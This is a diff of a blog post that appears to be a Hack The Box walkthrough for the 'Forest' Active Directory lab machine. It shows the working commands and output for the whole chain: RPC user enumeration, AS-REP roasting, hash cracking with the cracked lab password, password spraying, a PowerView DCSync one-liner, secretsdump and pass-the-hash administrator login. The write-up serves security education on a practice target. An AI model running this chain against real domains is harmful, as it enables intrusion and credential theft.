@@ -1,15 +1,17 @@
 ---
-title: "Forest Writeup(HTB)"
+title: "Forest Walkthrough(HTB)"
 date: 2025-03-07
 draft: false
 description: "a description"
-tags: ["HTB", "windows", "hacking", "Active Directory", "writeup"]
+tags: ["Easy", "windows","HTB", "hacking", "Active Directory", "walkthrough"]
 series: ["Hack The Box"]
 series_order: "1"
 
 ---
-## Reconnaissance and Enumeration #ActiveDirectory #Windows 
-- nmap results
+
+
+## Reconnaissance and Enumeration 
+- Nmap scan results:
 ```
 PORT      STATE SERVICE      VERSION
 53/tcp    open  domain       Simple DNS Plus
@@ -41,31 +43,35 @@ PORT      STATE SERVICE      VERSION
 49706/tcp open  msrpc        Microsoft Windows RPC
 49976/tcp open  msrpc        Microsoft Windows RPC
 ```
-- Checked SMB for guest or anonymous login but there isn't one. same for LDAP
-- LDAP
+- It's always good to look for low hanging fruit, So checked SMB for guest or anonymous login but there isn't any. Same with LDAP
+- When it's comes to enumeration my goto tool is always `netexec`. Netexec provides many options for Active Directory enumeration. I queried LDAP,
 ```
-HTB/Machines/Forest took 3s 
 ❯ netexec ldap htb.local -u anonymous -p anonymous
 SMB         10.10.10.161    445    FOREST           [*] Windows Server 2016 Standard 14393 x64 (name:FOREST) (domain:htb.local) (signing:True) (SMBv1:True)
 LDAP        10.10.10.161    389    FOREST           [-] htb.local\anonymous:anonymous 
 ```
-- SMB
+- Queried SMB, got nothing
 ```
 ❯ netexec smb htb.local -u sundeity -p ''                                        
 SMB         10.10.10.161    445    FOREST           [*] Windows Server 2016 Standard 14393 x64 (name:FOREST) (domain:htb.local) (signing:True) (SMBv1:True)
 SMB         10.10.10.161    445    FOREST           [-] htb.local\sundeity: STATUS_LOGON_FAILURE 
 
 ```
-- But learnt a new way to enumerate using `rpcclient` from `rpc` [Learn more](https://www.blackhillsinfosec.com/password-spraying-other-fun-with-rpcclient/)
-- Using null login
-```
+- Which was weird for an easy box, this triggered lot of questions inside me. On searching the web I found about a new technique. Apparently I can enumerate `rpc` using `rpcclient`. If you are more interested about this i'll leave the  articles link  
+{{< details summary="Links to the Articles" >}}
+[Article-1](https://www.hackingarticles.in/active-directory-enumeration-rpcclient/)
+<br>
+[Article-2](https://www.blackhillsinfosec.com/password-spraying-other-fun-with-rpcclient/)
+{{< /details >}}
+- Using null login to connect with rpc
+```bash
 rpcclient -U "" -N 10.10.10.161
 ```
-- And then by this command got users info``
-```
+- Using the below command I can enumerate users on the domain
+```bash
 enumdomusers
 ```
-- Output:
+- **Output:**
 ```
 rpcclient $> enumdomusers
 user:[Administrator] rid:[0x1f4]
@@ -100,7 +106,7 @@ user:[andy] rid:[0x47e]
 user:[mark] rid:[0x47f]
 user:[santi] rid:[0x480]
 ```
-- Copied the users into a file
+- As I got the users now I copied all the users into a file. So that I can enumerate further with it.
 ```
 ❯ cat users.txt
 Administrator
@@ -112,15 +118,15 @@ andy
 mark
 santi
 ```
-- Can also enumerate for groups 
-```
+- Like this isn't enough we can also enumerate for groups in the domain using below command by querying RPC 
+```bash
 enumdomgroups
 ```
-- or for a particular group
-```
+- We can also query information of a particular group with this command
+```bash
 querygroup <sid>
 ```
-- Verified the users in the list
+- Now to our real path, I used kerbrute to verify the usernames that I got from RPC earlier and all of them were legit 🤗
 ```
 ❯ kerbrute userenum --dc htb.local  -d htb.local users.txt      
 
@@ -145,8 +151,12 @@ Version: dev (n/a) - 01/13/25 - Ronnie Flathers @ropnop
 ```
 
 - ## Exploitation
-- Checked for `DONT_REQUIRE_PREAUTH` for the user accounts and got hash for user `svc-alfresco`
-```
+- As I was desperatly looking for a low hanging fruit I checked user accounts that had `DONT_REQUIRE_PREAUTH`. Lucky me I got one user which is none other than `svc-alfresco`.
+- This `Pre-Auth` concept is pretty simple let's learn about it, As part of the Kerberos authentication process in Active Directory, there is an initial request to authenticate without a password. This is an artifact left over from Kerberos versions earlier than Kerberos 5. In these earlier versions, Kerberos would allow authentication without a password.
+Now, in Kerberos 5, a password is required, which is called “Pre-Authentication.” When looking at the Kerberos exchanges during log-on, you will initially see an AS-REQ (Authentication Server Request) followed by a Kerberos error, which will state that pre-auth is required.
+- But in some cases accounts might be configured to authenticate without a Pre-Auth, well yeah which obiviously a misconfiguration. Using below the tool below I abused it and got the TGT from kerberos 
+
+```bash
 for i in $(cat users.txt); do GetNPUsers.py -no-pass htb.local/${i} -dc-ip 10.10.10.161; done
 ```
 - Output:
@@ -201,8 +211,8 @@ Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies
 [-] User santi doesn't have UF_DONT_REQUIRE_PREAUTH set
 ```
 
-- Cracked the hash and got the password
-```
+- To get the password I cracked the TGT using hashcat and got the password
+```bash
 hashcat -a 0 hash /usr/share/wordlists/rockyou.txt
 ```
 - Output:
@@ -235,7 +245,7 @@ Candidates.#1....: s9039554h -> s/nd/0s
 Hardware.Mon.#1..: Temp: 66c Util: 25%
 
 ```
-- There were no shares for this user
+- Now I have full access over user `svc-alfresco` (Password is not redacted down here, Enjoy!😉). I initiated password spraying attack on SMB. This is what I usually do when I get a new password. But I didn't get any hit on other accounts, Which is sad 😥 to be honest.
 ```
 ❯ netexec smb htb.local -u users.txt -p 's3rvice' --shares --continue-on-success
 SMB         10.10.10.161    445    FOREST           [*] Windows Server 2016 Standard 14393 x64 (name:FOREST) (domain:htb.local) (signing:True) (SMBv1:True)
@@ -248,7 +258,7 @@ SMB         10.10.10.161    445    FOREST           [-] htb.local\andy:s3rvice S
 SMB         10.10.10.161    445    FOREST           [-] htb.local\mark:s3rvice STATUS_LOGON_FAILURE 
 SMB         10.10.10.161    445    FOREST           [-] htb.local\santi:s3rvice STATUS_LOGON_FAILURE 
 ```
-- Bingo! Got winrm access
+- I tried the same on WinRM service and guess what, Bingo! Got winrm access. Even if I got any hit on other accounts earlier it would have been hectic to pivot, hey! anyway less steps to work. 
 ```
 ❯ netexec winrm htb.local -u users.txt -p 's3rvice' --continue-on-success  
 WINRM       10.10.10.161    5985   FOREST           [*] Windows 10 / Server 2016 Build 14393 (name:FOREST) (domain:htb.local)
@@ -277,19 +287,21 @@ Info: Establishing connection to remote endpoint
 *Evil-WinRM* PS C:\Users\svc-alfresco\Documents> 
 ```
 - ## Privilege escalation
-- Got the bloodhound data
-- ![Bloodhound picture](https://github.com/Emp5r0R/Obsidian_vault/blob/main/shots/Pasted%20image%2020250114004642.png?raw=true)
-- We have `genericAll` and `writeDACL` to abuse.
-- Invoke powerview
-```
+- Now using the user account `svc_alfresco` I collected data for Bloodhound
+- ![Bloodhound picture](https://github.com/Emp5r0R/Db_of-pics/blob/main/Pasted%20image%2020250114004642.png?raw=true)
+- As we can see from the above picture we have `genericAll` and `writeDACL` to abuse. We can use the steps from Bloodhound it's pretty neat.
+- Invoking powerview within the shell
+```shell
 Import-Module .\powerview.ps1
 ```
 - This is the one liner
-```
+```shell
  Add-DomainGroupMember -Identity 'Exchange Windows Permissions' -Members svc-alfresco; $username = "htb\svc-alfresco"; $password = "s3rvice"; $secstr = New-Object -TypeName System.Security.SecureString; $password.ToCharArray() | ForEach-Object {$secstr.AppendChar($_)}; $cred = new-object -typename System.Management.Automation.PSCredential -argumentlist $username, $secstr; Add-DomainObjectAcl -Credential $Cred -PrincipalIdentity 'svc-alfresco' -TargetIdentity 'HTB.LOCAL\Domain Admins' -Rights DCSync
 ```
-- Now run secrets dump to get the hash
-```
+- Atlast I can run secrets dump to dump all those secrets 
+
+![NoMoreSecretsLeft](https://media3.giphy.com/media/v1.Y2lkPTc5MGI3NjExdXFiZzlwbmR6cGs3Y2xqYWY5NGk5bDl5NHA5MjlxNGQwY200cms1NiZlcD12MV9pbnRlcm5hbF9naWZfYnlfaWQmY3Q9Zw/xgKMBQdvMF3GpPpPml/giphy.gif)
+```bash
 secretsdump.py svc-alfresco:s3rvice@10.10.10.161
 ```
 - **Output**
@@ -399,7 +411,7 @@ EXCH01$:des-cbc-md5:8c45f44c16975129
 [*] Cleaning up... 
 
 ```
-- Logged in using winrm and got the root flag
+- We got everything we can, "we" successfully acheived a hacker's dream, Logged in using winrm as administrator and got the root flag
 ```
 ❯ evil-winrm -u administrator -H 32693b<hidden> -i htb.local                                  
                                         
@@ -414,3 +426,8 @@ Info: Establishing connection to remote endpoint
 <redacted>
 
 ```
+{{< typeit >}}
+This concludes my walkthrough, see ya... In the mean time check out my other posts 😏
+{{< /typeit >}}
+
+![Conclusion](https://media3.giphy.com/media/v1.Y2lkPTc5MGI3NjExeTJwbWhqdjJueXU5enR0enB1dXlvYmg5ZzNpMjA0b3UyZWkweGplbyZlcD12MV9pbnRlcm5hbF9naWZfYnlfaWQmY3Q9Zw/ntl8yJ3ctzYHdJPm02/giphy.gif) 
